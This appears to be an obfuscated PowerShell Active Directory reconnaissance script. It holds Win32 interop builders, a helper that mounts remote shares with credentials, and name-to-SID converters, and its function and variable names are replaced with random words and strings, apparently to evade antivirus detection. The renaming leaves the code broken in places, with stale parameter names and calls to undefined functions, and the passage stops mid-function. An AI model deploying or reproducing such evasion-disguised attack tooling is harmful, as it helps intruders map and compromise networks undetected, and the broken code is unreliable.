function accompanying {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $MmIhysbd99 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $RPSCCQDH99 = $MmIhysbd99.GetAssemblies()
    foreach ($rOXRcpUP99 in $RPSCCQDH99) {
        if ($rOXRcpUP99.FullName -and ($rOXRcpUP99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $rOXRcpUP99
        }
    }
    $MjMKxhqN99 = New-Object Reflection.AssemblyName($ModuleName)
    $UtXBFQsM99 = $MmIhysbd99
    $fQXBZNXv99 = $UtXBFQsM99.DefineDynamicAssembly($MjMKxhqN99, 'Run')
    $xhZqgxKl99 = $fQXBZNXv99.DefineDynamicModule($ModuleName, $False)
    return $xhZqgxKl99
}
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $yLdAljKd99,
        [Switch]
        $SetLastError
    )
    $rtPnFfWd99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $rtPnFfWd99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $rtPnFfWd99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $rtPnFfWd99['Charset'] = $Charset }
    if ($SetLastError) { $rtPnFfWd99['SetLastError'] = $SetLastError }
    if ($yLdAljKd99) { $rtPnFfWd99['EntryPoint'] = $yLdAljKd99 }
    New-Object PSObject -Property $rtPnFfWd99
}
function proved
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $yLdAljKd99,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $sjaammRU99 = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $sjaammRU99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $sjaammRU99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$sjaammRU99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $sjaammRU99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $sjaammRU99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $fQOJfqWf99 = $sjaammRU99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($droAMVFV99 in $ParameterTypes)
            {
                if ($droAMVFV99.IsByRef)
                {
                    [void] $fQOJfqWf99.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $UUcgPKBw99 = [Runtime.InteropServices.DllImportAttribute]
            $uPQOqYvE99 = $UUcgPKBw99.GetField('SetLastError')
            $qxIAzCxY99 = $UUcgPKBw99.GetField('CallingConvention')
            $hAHglRPr99 = $UUcgPKBw99.GetField('CharSet')
            $XvFuKYZp99 = $UUcgPKBw99.GetField('EntryPoint')
            if ($SetLastError) { $bJAejkWL99 = $True } else { $bJAejkWL99 = $False }
            if ($PSBoundParameters['EntryPoint']) { $KQkLBMiv99 = $yLdAljKd99 } else { $KQkLBMiv99 = $FunctionName }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $WqYtshZV99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($uPQOqYvE99,
                                           $qxIAzCxY99,
                                           $hAHglRPr99,
                                           $XvFuKYZp99),
                [Object[]] @($bJAejkWL99,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $KQkLBMiv99))
            $fQOJfqWf99.SetCustomAttribute($WqYtshZV99)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $sjaammRU99
        }
        $MiqFwfpq99 = @{}
        foreach ($Key in $sjaammRU99.Keys)
        {
            $Type = $sjaammRU99[$Key].CreateType()
            $MiqFwfpq99[$Key] = $Type
        }
        return $MiqFwfpq99
    }
}
function courthouse {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $nNsUNWrp99,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XcHbWIiY99,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($nNsUNWrp99))
    }
    $WznjLlTz99 = $Type -as [Type]
    $QshRajTr99 = $Module.DefineEnum($nNsUNWrp99, 'Public', $WznjLlTz99)
    if ($Bitfield)
    {
        $TOgYGlYM99 = [FlagsAttribute].GetConstructor(@())
        $PDgwwOiz99 = New-Object Reflection.Emit.CustomAttributeBuilder($TOgYGlYM99, @())
        $QshRajTr99.SetCustomAttribute($PDgwwOiz99)
    }
    foreach ($Key in $XcHbWIiY99.Keys)
    {
        $null = $QshRajTr99.DefineLiteral($Key, $XcHbWIiY99[$Key] -as $WznjLlTz99)
    }
    $QshRajTr99.CreateType()
}
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $IOyTSOKZ99,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $gqSThzCi99,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $IOyTSOKZ99
        Type = $Type -as [Type]
        Offset = $gqSThzCi99
        MarshalAs = $MarshalAs
    }
}
function stair
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $nNsUNWrp99,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EhQrTkkL99,
        [Reflection.Emit.PackingSize]
        $iglIhuJN99 = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $IBsJlubE99
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($nNsUNWrp99))
    }
    [Reflection.TypeAttributes] $uWFWaqJL99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($IBsJlubE99)
    {
        $uWFWaqJL99 = $uWFWaqJL99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $uWFWaqJL99 = $uWFWaqJL99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $ZpXXASyZ99 = $Module.DefineType($nNsUNWrp99, $uWFWaqJL99, [ValueType], $iglIhuJN99)
    $mnbgimOi99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $CLSSmGlB99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $gBYaQZjk99 = New-Object Hashtable[]($EhQrTkkL99.Count)
    foreach ($Field in $EhQrTkkL99.Keys)
    {
        $Index = $EhQrTkkL99[$Field]['Position']
        $gBYaQZjk99[$Index] = @{FieldName = $Field; Properties = $EhQrTkkL99[$Field]}
    }
    foreach ($Field in $gBYaQZjk99)
    {
        $enndxmCU99 = $Field['FieldName']
        $uXJvQxDu99 = $Field['Properties']
        $gqSThzCi99 = $uXJvQxDu99['Offset']
        $Type = $uXJvQxDu99['Type']
        $MarshalAs = $uXJvQxDu99['MarshalAs']
        $APKZjiNK99 = $ZpXXASyZ99.DefineField($enndxmCU99, $Type, 'Public')
        if ($MarshalAs)
        {
            $aMYTAOio99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $cJIpTVOm99 = New-Object Reflection.Emit.CustomAttributeBuilder($mnbgimOi99,
                    $aMYTAOio99, $CLSSmGlB99, @($Size))
            }
            else
            {
                $cJIpTVOm99 = New-Object Reflection.Emit.CustomAttributeBuilder($mnbgimOi99, [Object[]] @($aMYTAOio99))
            }
            $APKZjiNK99.SetCustomAttribute($cJIpTVOm99)
        }
        if ($IBsJlubE99) { $APKZjiNK99.SetOffset($gqSThzCi99) }
    }
    $PZWTraoo99 = $ZpXXASyZ99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $QsTRsfnq99 = $PZWTraoo99.GetILGenerator()
    $QsTRsfnq99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $ZpXXASyZ99)
    $QsTRsfnq99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $QsTRsfnq99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $QsTRsfnq99.Emit([Reflection.Emit.OpCodes]::Ret)
    $rhXZBZBA99 = $ZpXXASyZ99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $ZpXXASyZ99,
        [Type[]] @([IntPtr]))
    $xiwWXULD99 = $rhXZBZBA99.GetILGenerator()
    $xiwWXULD99.Emit([Reflection.Emit.OpCodes]::Nop)
    $xiwWXULD99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $xiwWXULD99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $ZpXXASyZ99)
    $xiwWXULD99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $xiwWXULD99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $xiwWXULD99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $ZpXXASyZ99)
    $xiwWXULD99.Emit([Reflection.Emit.OpCodes]::Ret)
    $ZpXXASyZ99.CreateType()
}
Function salesclerk {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$QOiICcvi99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$IOyTSOKZ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$nVzMgIEz99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ljsPscsG99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$YjvwRCwp99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$YktnxBrL99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$nwsFaCpl99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$zSXITmSy99 = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$uLgYNpcV99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$SQwvjdQn99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$OINQnyFz99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$oxKjDmSH99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$hqjihNJi99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$sDezEDcz99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$GbhLwrwF99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$RPOpmSsy99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$EtyKNqpk99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$BvqORHiL99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$BobOgiWP99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $kFzfoyDY99 = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CoUPmHUh99,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $kMozdLZB99
    )
    Begin {
        $dqnxLDjz99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $yUFTNAHR99 = (Get-Command _temp).Parameters.Keys
    }
    Process {
        if($CoUPmHUh99) {
            $hOZDwAxQ99 = $kMozdLZB99.Keys | Where-Object { $yUFTNAHR99 -notcontains $_ }
            ForEach($droAMVFV99 in $hOZDwAxQ99) {
                if ($droAMVFV99) {
                    Set-Variable -Name $droAMVFV99 -Value $kMozdLZB99.$droAMVFV99 -Scope 1 -Force
                }
            }
        }
        else {
            $NIjQokNv99 = @()
            $NIjQokNv99 = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($NIjQokNv99) {
                $NIjQokNv99 | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }
            $xpCjMWtl99 = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            $tmp = $null
            ForEach ($droAMVFV99 in $xpCjMWtl99) {
                $sRynDWCQ99 = Get-Variable -Name $droAMVFV99 -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($droAMVFV99, [ref]$tmp) -and $sRynDWCQ99) {
                    $PSBoundParameters.$droAMVFV99 = $sRynDWCQ99
                }
            }
            if($kFzfoyDY99) {
                $MDoLzvJV99 = $kFzfoyDY99
            }
            else {
                $MDoLzvJV99 = $dqnxLDjz99
            }
            $OKJLXwjX99 = {Get-Variable -Name $_ -ValueOnly -Scope 0}
            $RxoVctvB99 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $MdtTEtyC99 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $CZBlqRYN99 = '^Alias$'
            $kxrciEGA99 = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                $RxoVctvB99 {
                    Try {
                        $kxrciEGA99.$_ = . $OKJLXwjX99
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if($MDoLzvJV99.Keys -contains $Name) {
                $MDoLzvJV99.$Name.Attributes.Add($kxrciEGA99)
            }
            else {
                $HEDxuxCj99 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $MdtTEtyC99 {
                        Try {
                            $liJXKLyG99 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $OKJLXwjX99) -ErrorAction Stop
                            $HEDxuxCj99.Add($liJXKLyG99)
                        }
                        Catch { $_ }
                        continue
                    }
                    $CZBlqRYN99 {
                        Try {
                            $wgGSzjjt99 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $OKJLXwjX99) -ErrorAction Stop
                            $HEDxuxCj99.Add($wgGSzjjt99)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $HEDxuxCj99.Add($kxrciEGA99)
                $droAMVFV99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $HEDxuxCj99)
                $MDoLzvJV99.Add($Name, $droAMVFV99)
            }
        }
    }
    End {
        if(!$CoUPmHUh99 -and !$kFzfoyDY99) {
            $MDoLzvJV99
        }
    }
}
function Victorian {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $brFzsnlQ99
    )
    BEGIN {
        $FfETXugp99 = @{}
    }
    PROCESS {
        ForEach ($JetVKPlT99 in $Path) {
            if (($JetVKPlT99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $eNGCfBcN99 = (New-Object System.Uri($JetVKPlT99)).Host
                if (-not $FfETXugp99[$eNGCfBcN99]) {
                    Staci -FRrsCtDf99 $eNGCfBcN99 -fxunRYJT99 $fxunRYJT99
                    $FfETXugp99[$eNGCfBcN99] = $True
                }
            }
            if (Test-Path -Path $JetVKPlT99) {
                if ($PSBoundParameters['OutputObject']) {
                    $EyfiVBvM99 = New-Object PSObject
                }
                else {
                    $EyfiVBvM99 = @{}
                }
                Switch -Regex -File $JetVKPlT99 {
                    "^\[(.+)\]" # Section
                    {
                        $GIacGYMU99 = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $GIacGYMU99 = $GIacGYMU99.Replace(' ', '')
                            $oVhGJaMr99 = New-Object PSObject
                            $EyfiVBvM99 | Add-Member Noteproperty $GIacGYMU99 $oVhGJaMr99
                        }
                        else {
                            $EyfiVBvM99[$GIacGYMU99] = @{}
                        }
                        $TkJQVqRq99 = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $TkJQVqRq99 = $TkJQVqRq99 + 1
                        $Name = 'Comment' + $TkJQVqRq99
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $EyfiVBvM99.$GIacGYMU99 | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $EyfiVBvM99[$GIacGYMU99][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $FPWyclXr99 = $Value.split(',') | ForEach-Object { $_.Trim() }
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $EyfiVBvM99.$GIacGYMU99 | Add-Member Noteproperty $Name $FPWyclXr99
                        }
                        else {
                            $EyfiVBvM99[$GIacGYMU99][$Name] = $FPWyclXr99
                        }
                    }
                }
                $EyfiVBvM99
            }
        }
    }
    END {
        $FfETXugp99.Keys | outsmarts
    }
}
function Salish {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $XhUYaBAP99,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $CFyPzCMd99 = ',',
        [Switch]
        $aKvSGlbZ99
    )
    BEGIN {
        $PJEQiCGX99 = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $WxAaiRlR99 = [System.IO.File]::Exists($PJEQiCGX99)
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()
        if ($PSBoundParameters['Append']) {
            $fiDvngxm99 = [System.IO.FileMode]::Append
        }
        else {
            $fiDvngxm99 = [System.IO.FileMode]::Create
            $WxAaiRlR99 = $False
        }
        $FHEFIzbq99 = New-Object IO.FileStream($PJEQiCGX99, $fiDvngxm99, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $TWRqYqPg99 = New-Object System.IO.StreamWriter($FHEFIzbq99)
        $TWRqYqPg99.AutoFlush = $True
    }
    PROCESS {
        ForEach ($Entry in $XhUYaBAP99) {
            $XpWOgUTP99 = ConvertTo-Csv -XhUYaBAP99 $Entry -CFyPzCMd99 $CFyPzCMd99 -NoTypeInformation
            if (-not $WxAaiRlR99) {
                $XpWOgUTP99 | ForEach-Object { $TWRqYqPg99.WriteLine($_) }
                $WxAaiRlR99 = $True
            }
            else {
                $XpWOgUTP99[1..($XpWOgUTP99.Length-1)] | ForEach-Object { $TWRqYqPg99.WriteLine($_) }
            }
        }
    }
    END {
        $Mutex.ReleaseMutex()
        $TWRqYqPg99.Dispose()
        $FHEFIzbq99.Dispose()
    }
}
function asked {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = $Env:COMPUTERNAME
    )
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            try {
                @(([Net.Dns]::GetHostEntry($aJJGHudX99)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[asked] Could not resolve $aJJGHudX99 to an IP Address."
            }
        }
    }
}
function secedes {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $NUBJRpba99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $RaeePKHT99 = @{}
        if ($PSBoundParameters['Domain']) { $RaeePKHT99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Server']) { $RaeePKHT99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['Credential']) { $RaeePKHT99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        ForEach ($Object in $NUBJRpba99) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters['Credential']) {
                $DN = spokesmen -soGjewdO99 $Object -LkQAjVeR99 'DN' @DomainSearcherArguments
                if ($DN) {
                    $NzTnTiPA99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $pgSynGHL99 = $DN.Split(',')[0].split('=')[1]
                    $RaeePKHT99['Identity'] = $pgSynGHL99
                    $RaeePKHT99['Domain'] = $NzTnTiPA99
                    $RaeePKHT99['Properties'] = 'objectsid'
                    great @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $UtXBFQsM99 = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $RaeePKHT99 = @{}
                        $UtXBFQsM99 = (manège @DomainSearcherArguments).Name
                    }
                    $Obj = (New-Object System.Security.Principal.NTAccount($UtXBFQsM99, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[secedes] Error converting $UtXBFQsM99\$Object : $_"
                }
            }
        }
    }
}
function dotcom {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $xcFWvzAE99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $tOXBGEQK99 = @{}
        if ($PSBoundParameters['Domain']) { $tOXBGEQK99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Server']) { $tOXBGEQK99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['Credential']) { $tOXBGEQK99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        ForEach ($vUyIbYgw99 in $xcFWvzAE99) {
            $vUyIbYgw99 = $vUyIbYgw99.trim('*')
            try {
                Switch ($vUyIbYgw99) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
